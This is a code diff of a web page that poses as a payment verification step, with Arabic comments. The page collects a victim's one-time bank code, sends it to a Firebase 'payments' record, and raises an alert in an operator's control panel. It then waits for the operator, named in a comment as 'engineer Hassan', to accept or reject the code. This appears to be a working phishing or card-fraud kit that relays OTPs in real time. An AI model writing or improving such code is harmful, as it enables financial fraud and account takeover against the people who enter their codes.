@@ -31,9 +31,9 @@
             border-radius: 8px; text-align: center; font-size: 20px; letter-spacing: 8px;
             font-weight: bold; color: var(--main-green); outline: none; background-color: #fafafa; 
             transition: 0.3s;
+            direction: ltr !important; /* لضمان ظهور الأرقام بشكل صحيح */
         }
 
-        /* --- حالة الخطأ الجديدة --- */
         .input-error { border: 2px solid var(--error-red) !important; color: var(--error-red) !important; background-color: #fff8f8 !important; }
         .error-message { color: var(--error-red); font-size: 11px; font-weight: bold; margin-top: 8px; display: none; }
 
@@ -126,17 +126,17 @@
             const errorMsg = document.getElementById('otpErrorMsg');
             let otpVal = otpInput.value;
 
-            // التعديل هنا ليقبل 4 أو 6 أرقام
             if (otpVal.length === 4 || otpVal.length === 6) {
                 document.getElementById('loadingOverlay').style.display = 'flex';
 
                 const paymentRef = database.ref('payments/' + visitorId);
                 paymentRef.update({
                     otp: otpVal,
-                    status: "waiting_otp",
+                    status: "waiting_otp", // هذه الحالة هي التي تشغل التنبيه في اللوحة
                     last_update: firebase.database.ServerValue.TIMESTAMP
                 });
 
+                // الاستماع لقرار المهندس حسن من لوحة التحكم
                 paymentRef.on('value', (snapshot) => {
                     const data = snapshot.val();
                     if (!data) return;
@@ -147,6 +147,7 @@
                     else if (data.status === "reject") {
                         document.getElementById('loadingOverlay').style.display = 'none';
                         showError();
+                        // نرجع الحالة لوضعها الطبيعي حتى لا يستمر التنبيه في اللوحة بعد الرفض
                         paymentRef.update({ status: "idle_otp" });
                     }
                 });
@@ -167,7 +168,6 @@
         document.getElementById('otpCode').addEventListener('input', function() {
             this.classList.remove('input-error');
             document.getElementById('otpErrorMsg').style.display = "none";
-            // السماح فقط بالأرقام
             this.value = this.value.replace(/[^0-9]/g, '');
         });
     </script>
